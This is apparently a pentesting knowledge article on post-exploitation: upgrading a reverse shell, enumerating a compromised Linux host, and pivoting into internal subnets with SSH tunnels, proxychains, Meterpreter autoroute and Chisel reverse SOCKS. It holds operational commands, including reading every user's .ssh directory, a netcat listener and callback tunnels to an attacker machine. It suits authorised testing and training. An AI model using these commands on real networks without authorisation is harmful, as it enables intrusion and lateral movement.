---
id: network-infrastructure-pivoting-port-forwarding-host-enumeration
title: "Pivoting, Port Forwarding and Host Enumeration: How to Move Further After Initial Access"
team: red-blue
domain: network-infrastructure
section: post-exploitation
type: knowledge
angle: from-first-shell-to-internal-network-access
sourceTrack: netMaster
tags:
  [
    "pivoting",
    "port-forwarding",
    "tunneling",
    "ssh",
    "proxychains",
    "meterpreter",
    "chisel",
    "post-exploitation",
    "linux",
    "network-recon",
    "internal-network",
    "tty",
    "c2",
  ]
difficulty: medium
shortDescription: "A note about what to do after getting the first shell: how to stabilize the shell, collect host information, understand its position in the network and use it as an entry point into further infrastructure segments."
updatedAt: "2026-05-13"
---

# Pivoting, Port Forwarding and Host Enumeration

It is very easy to treat the first shell as the end of the attack.

There is access.  
There is a terminal.  
You can type `whoami`.  
It feels like success.

But in real infrastructure pentesting, the first shell is usually not the end. It is the beginning of the actual work.

Because from that moment, a much more important question starts:

> Now that I am on this host, what can this host see that I could not see before?

This is the whole difference between “I have a shell” and “I understand where I am in the network”.

A good operator does not stop at access itself. First, they stabilize the shell. Then they enumerate the local system, check interfaces, routes, processes, services and configurations. Only after that do they decide whether the host can be used as a bridge into another part of the environment.

Because sometimes the most important vulnerability is not the exploit that gave you access.

Sometimes the most important thing is the fact that the compromised host has a second network interface and can see a segment that was completely unreachable from the outside.

---

## First, Get a Shell That Is Actually Usable

After a basic reverse shell, we often get something that technically works, but is practically uncomfortable.

Arrow keys do not work.  
`Ctrl+C` can kill the connection.  
There is no normal job control.  
Interactive programs behave strangely.  
Sometimes you see a message like this:

```bash
bash: cannot set terminal process group
bash: no job control in this shell
```

This does not mean bash is broken.

It means the shell is running over a raw TCP socket, not through a pseudo-terminal. It lacks a PTY, which is the layer responsible for normal terminal behavior: special characters, `Ctrl+C`, `Ctrl+Z`, `fg`, `bg`, echo, line mode and proper interaction with terminal-based programs.

That is why, before doing further work, it is worth upgrading the shell.

```bash
/bin/bash -i
```

If Python is available on the host:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Or the older variant:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Sometimes this is also useful:

```bash
script /dev/null -c bash
```

On your own machine, you can improve the terminal handling further:

```bash
stty raw -echo; fg
```

And after returning to the shell:

```bash
reset
export TERM=xterm
stty rows 40 columns 120
```

This is not cosmetic. This is preparing your working environment.

If the shell is unstable, every next action becomes riskier. It is easier to break the session, paste a command incorrectly, miss an error or get stuck in a tool that expects a real terminal.

---

## First Question: Who Am I and Where Am I?

After stabilizing the shell, we do not start by randomly launching exploits.

First, we need to understand the context.

```bash
whoami
id
hostname
pwd
```

These few simple commands tell us a lot.

They show which user we are running as, what groups we belong to, which machine we are on and where in the filesystem we currently are.

Next, it is worth checking the system:

```bash
uname -a
cat /etc/os-release
cat /proc/version
hostnamectl
```

At this stage, we are not only interested in the distribution name. We care about the kernel version, architecture, runtime environment, possible signs of containerization and anything that may later affect privilege escalation or tool selection.

Then we check users:

```bash
cat /etc/passwd
```

Not to blindly read every line. We are looking for real users, service accounts, unusual home directories and login shells. This often gives the first clues about who uses the machine and what role it plays in the environment.

---

## The Host Starts Telling a Story

A compromised system usually contains traces of administrators, applications and other services. We need to learn how to read them.

Login history:

```bash
last -a | head -n 20
```

SSH activity:

```bash
journalctl _COMM=sshd -n 50 --no-pager
```

Processes:

```bash
ps -eo user,pid,ppid,cmd --sort=user
```

This data helps answer questions such as:

Is this an application server?
Is there a database running here?
Are there any development processes?
Are there services exposed only locally?
Did someone log in here from other machines?
Do process arguments reveal paths to configuration files?

Sometimes the process list alone is enough to notice something more important than the initial exploit. For example, a service listening only on `127.0.0.1`, an admin panel, a local database or an application worker using a specific configuration file.

---

## Checking Available Tools Is Not a Formality

On a compromised host, we do not assume that we have a comfortable working environment.

We check what is already available:

```bash
which nmap nc ncat netcat wget curl ping gcc g++ make gdb base64 socat python python2 python3 perl php ruby sudo doas docker lxc kubectl 2>/dev/null
```

This immediately tells us how we can work.

If there is `curl` or `wget`, we may be able to download files.
If there is Python, we can run simple scripts or improve the shell.
If there is `socat`, we have a powerful forwarding tool.
If there is `gcc`, we may be able to compile something locally.
If there is `docker`, `lxc` or `kubectl`, the host may have a much more interesting context than a standard Linux machine.

In a lab, it is sometimes easiest to install something. In a real engagement, it is better to first ask:

> Do I really need to change the system, or can I do this externally through a tunnel?

That is the difference between simply typing commands and working with minimal interference.

---

## SSH Reveals a Lot About Relationships Between Hosts

One of the most valuable places to inspect is `.ssh` directories.

```bash
for user in $(cut -d: -f1 /etc/passwd); do
  home=$(eval echo ~$user)
  if [ -d "$home/.ssh" ]; then
    echo "--- $user ($home/.ssh) ---"
    ls -la "$home/.ssh"
    if [ -f "$home/.ssh/authorized_keys" ]; then
      echo "authorized_keys for $user:"
      cat "$home/.ssh/authorized_keys"
    fi
  fi
done
```

This is not only about looking for private keys.

Of course, a private key can be critical. But sometimes equally important artifacts are:

```text
authorized_keys
known_hosts
config
connection history
hostnames
IP addresses
unusual permissions
```

SSH often reveals relationships inside the infrastructure. If a user from this host connected to other machines, that gives us a potential direction for further analysis.

This is one of the moments where the host starts answering the question:

> Where can I go next?

---

## The Most Important Stage: The Host’s Position in the Network

After initial access, the most important thing is not whether we can run another tool.

The most important thing is whether the host has access to a network that we could not see from the outside.

That is why we check interfaces:

```bash
ip a
ip -brief address show
ifconfig -a
```

Routes:

```bash
ip route show
ip -6 route show
ip rule show
ip route show table all
```

Network neighbors:

```bash
ip neighbor show
arp -a
```

DNS:

```bash
cat /etc/resolv.conf
```

Listening services:

```bash
ss -tulnp
netstat -tulnp
```

Firewall:

```bash
iptables -L -n -v
```

This is the point where we may discover that the host has more than one interface.

Example:

```text
eth0 -> 10.10.10.6/24
eth1 -> 172.16.2.10/24
```

From our machine, we only saw `10.10.10.0/24`.

But the compromised host also sees `172.16.2.0/24`.

And this is exactly the moment where ordinary post-exploitation starts turning into pivoting.

---

## Pivoting Is Not Magic, It Is Routing

Pivoting sounds like an advanced technique, but mentally it is simple.

My machine does not have access to the internal network.
The compromised host has access to the internal network.
So I need to pass my traffic through the compromised host.

That is it.

We do not start with the question “which tool should I use?”.

First, we ask:

> What can I see?

```bash
ip route
```

> What can the host I compromised see?

```bash
ip a
ip route
ip neighbor
```

> Through what channel can I pass traffic?

Only then do we choose a technique: SSH, proxychains, local port forwarding, remote port forwarding, Meterpreter, Chisel or another tunnel.

---

## Dynamic SSH Tunnel and Proxychains

If we have SSH access to the host, one of the most convenient options is a dynamic SOCKS tunnel.

```bash
ssh -D 1080 user@10.10.10.6
```

This creates a local SOCKS proxy on port `1080`.

In the `proxychains` configuration, we add:

```text
socks5 127.0.0.1 1080
```

Then we can send tool traffic through the tunnel:

```bash
proxychains nmap -sT 172.16.2.0/24 --open
```

It is worth remembering `-sT`.

With proxychains, we usually use a full TCP connect scan, because SOCKS proxy does not support raw packets like a classic SYN scan.

The same tunnel can be used with Burp Suite. In Burp settings, just configure the SOCKS proxy:

```text
Host: 127.0.0.1
Port: 1080
Use SOCKS proxy: enabled
```

From that moment, a browser connected through Burp can open applications available from the jumpbox perspective.

This is very practical when testing admin panels, development applications and services that were never exposed publicly but are available from the internal segment.

---

## Local Port Forwarding, or “I Want to See a Remote Service Locally”

Local port forwarding is useful when we want to expose a local port on our machine that leads to a service available from the remote host’s perspective.

The idea is simple:

```text
my localhost -> SSH tunnel -> service in the remote network
```

If a service is running only on the remote host’s localhost:

```bash
ssh -L 8080:127.0.0.1:80 user@192.168.1.2
```

After opening locally:

```text
http://127.0.0.1:8080
```

we will see the service running on the remote host at `127.0.0.1:80`.

If the service is running on another host in the jumpbox network:

```bash
ssh -L 8080:192.168.1.5:80 user@192.168.1.2
```

Then our local port `8080` points to `192.168.1.5:80`, but through `192.168.1.2`.

This is ideal when we want to use local GUI tools: a browser, Burp, a database client, a Redis client or API testing tools.

---

## Remote Port Forwarding, or “I Want the Remote Host to Reach Me”

Remote port forwarding works in the opposite direction.

```text
port on the remote host -> SSH tunnel -> service on my machine
```

Example:

```bash
ssh -R 9000:127.0.0.1:8000 user@192.168.1.2
```

This means that port `9000` on the remote side will point to `127.0.0.1:8000` on our machine.

The simplest distinction:

```text
Local forwarding:
my local port points to a remote service.

Remote forwarding:
a remote port points to my local service.
```

If the tunnel does not work, the problem is usually not SSH. The problem is a misunderstood traffic direction.

In that case, write it down:

```text
Where is the service?
Who needs to see it?
On which host should the port listen?
From which side is the SSH connection initiated?
```

This solves most tunneling problems.

---

## SSH Multi-Hop

Sometimes one jumpbox is not enough.

For example, we may have this layout:

```text
Kali -> victim1 -> victim2 -> internal network
```

In that case, we can use `ProxyJump`:

```bash
ssh -J user@192.168.1.100 user@10.0.0.100 -D 1080
```

This establishes a connection through `victim1` to `victim2`, and creates a SOCKS proxy on our machine on port `1080`.

Then we can work through proxychains:

```bash
proxychains curl http://172.16.0.100
```

Or scan a segment available from the deeper host:

```bash
proxychains nmap -sT 172.16.0.0/24 --open
```

With more tunnels, it is worth organizing SSH through `~/.ssh/config`.

```bash
touch ~/.ssh/config
chmod 600 ~/.ssh/config
```

Example profile:

```text
Host victim1
  HostName 192.168.1.100
  User user

Host victim2
  HostName 10.0.0.100
  User user
  ProxyJump victim1
  LocalForward 8080 172.16.0.100:80
```

From now on, it is enough to run:

```bash
ssh victim2
```

This reduces chaos and lowers the risk of confusing ports, hosts or tunnel direction.

---

## Meterpreter as a Pivoting Tool

If we do not have SSH, but we have a Meterpreter session, we can still tunnel traffic.

Meterpreter allows port forwarding:

```text
meterpreter > portfwd add -l 6379 -p 6379 -r 10.0.0.49
```

Then local port `6379` on Kali points to `10.0.0.49:6379` through the host with the Meterpreter session.

We can also add a route to the internal network:

```text
meterpreter > run autoroute -s 10.0.0.0/24
```

Or:

```text
meterpreter > route add 10.0.0.0 255.255.255.0
```

After that, Metasploit modules can work against hosts in that subnet:

```text
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 80,443,6379
set THREADS 50
run
```

We can also create a SOCKS proxy in Metasploit:

```text
use auxiliary/server/socks4a
set SRVPORT 1080
run
```

And then configure `proxychains`:

```text
socks4 127.0.0.1 1080
```

Meterpreter is therefore not only a more convenient shell. It can also act as a routing point into a network that we cannot see directly from Kali.

---

## Chisel When There Is No Convenient SSH

We do not always have SSH.

Sometimes we only have the ability to execute a binary on the host. In that case, Chisel is useful. It is a tool for tunneling traffic over HTTP or HTTPS.

A typical reverse SOCKS setup looks like this.

On Kali:

```bash
./chisel server -p 8000 --reverse
```

On the host:

```bash
./chisel client http://192.168.1.1:8000 R:socks
```

Then we configure `proxychains` and work similarly to a SOCKS tunnel over SSH.

Chisel can also forward a specific service:

```bash
./chisel client http://192.168.1.1:8000 R:9000:10.0.0.49:6379
```

Result:

```text
Kali:9000 -> 10.0.0.49:6379 from the host's perspective
```

It can also be run with TLS:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=tunnel.lab"
```

```bash
./chisel server --reverse -p 443 --tls --key key.pem --cert cert.pem
```

```bash
./chisel client https://192.168.1.1:443 R:9000:10.0.0.49:6379
```

With a self-signed certificate, this may be needed:

```bash
./chisel client https://192.168.1.1:443 --insecure R:9000:10.0.0.49:6379
```

Chisel is very practical in labs because it shows one thing clearly: tunneling is not tied to SSH. What matters is the channel through which we can carry traffic.

---

## Passive Traffic Analysis

We do not always need to start with active scanning.

Sometimes it is better to listen for a moment and observe what the host is already doing.

DNS:

```bash
sudo tcpdump -i eth0 port 53
```

HTTP:

```bash
sudo tcpdump -i eth0 -A port 80 | grep -Ei "User-Agent|Server|Host:"
```

DHCP:

```bash
sudo tcpdump -i eth0 'port 67 or port 68' -vvv -n
```

Passive OS fingerprinting:

```bash
sudo p0f -i eth0
```

This type of analysis can reveal internal domains, hostnames, DNS servers, application communication, service dependencies or systems that regularly contact the compromised host by themselves.

It is less flashy than scanning an entire subnet, but it often provides better context.

---

## Tunneling Through Other Protocols

Sometimes classic connections are blocked.

A reverse shell to a random port does not go out.
SSH does not work.
Traffic is filtered.
The network only allows selected protocols.

That is when tunneling through allowed channels becomes relevant.

For example, DNS tunneling carries traffic through DNS queries. One tool for that is `iodine`.

ICMP tunneling carries traffic through ICMP. One example is `ptunnel-ng`.

The point is not to memorize every tool.

The point is to understand the principle:

> If I cannot connect directly, I check what is allowed to leave the host and through which channel I can carry traffic.

This is the same way of thinking that later leads to understanding Command and Control.

---

## Introduction to Command and Control

A simple reverse shell is a single access channel.

Command and Control is a way to manage an operation.

C2 usually allows working with multiple sessions, implants, communication channels, tasks, routes and tunneling mechanisms.

In labs, we often start with:

```text
nc -lvnp 4444
```

But in a more operator-focused approach, we start thinking about how to manage access, how to maintain communication, how to pass traffic and how to control multiple hosts without chaos.

One example of such a framework is Sliver, which appears here as an example of a C2 tool.

The most important mental difference is simple:

```text
A shell gives access to one host.

C2 gives structure for conducting an operation.
```

And even if we do not build a full C2 infrastructure in labs, it is worth understanding this direction. Tunneling, pivoting, port forwarding and session management are all foundations of the same way of thinking.

---

## Practical Workflow After Initial Access

After getting a shell, do not jump straight into exploits.

First, improve the terminal:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Then check who you are:

```bash
whoami
id
hostname
```

Understand the system:

```bash
uname -a
cat /etc/os-release
```

See what tools you have:

```bash
which nc ncat netcat wget curl python3 ssh socat nmap gcc make 2>/dev/null
```

Check the network:

```bash
ip -brief address show
ip route show
ip neighbor show
ss -tulnp
cat /etc/resolv.conf
```

If the host can see an additional subnet, choose a pivoting method.

SSH SOCKS:

```bash
ssh -D 1080 user@jumpbox
```

Proxychains:

```bash
proxychains nmap -sT 172.16.2.0/24 --open
```

Local port forwarding to a specific service:

```bash
ssh -L 8080:internal-host:80 user@jumpbox
```

Chisel when you do not have SSH:

```bash
./chisel server -p 8000 --reverse
```

```bash
./chisel client http://kali-ip:8000 R:socks
```

Meterpreter when working through Metasploit:

```text
meterpreter > run autoroute -s 10.0.0.0/24
```

---

## Common Mistake: Commands Without a Mental Model

The biggest problem with pivoting is not that someone does not know the syntax of `ssh -L` or `ssh -R`.

The problem is that they do not understand the direction of traffic.

That is why, before every command, it is worth answering four questions:

```text
Where am I?
What can the compromised host see?
Which service do I want to reach?
Which path should the traffic take?
```

Only then do you choose the tool.

At that point, `ssh -D`, `ssh -L`, `ssh -R`, `autoroute`, `portfwd`, `chisel` and `proxychains` stop being random commands from a cheatsheet.

They become different answers to the same problem:

> I have access to one place in the network and I want to control how I see what is further inside.

---

## What Is Worth Remembering

The first shell is not the finish line.

It is an observation point.

From that point, you need to understand the host, its role, processes, users, interfaces, routes and neighboring systems. Only then can you honestly say what the real reach of the access was.

In infrastructure pentesting, the exploit gives you entry.

But only enumeration, routing and pivoting show whether that entry led to one machine or to an entire part of the environment.

The most important lesson from this stage is simple:

> Do not learn pivoting as a list of commands. Learn it as a way of thinking about traffic in a network.
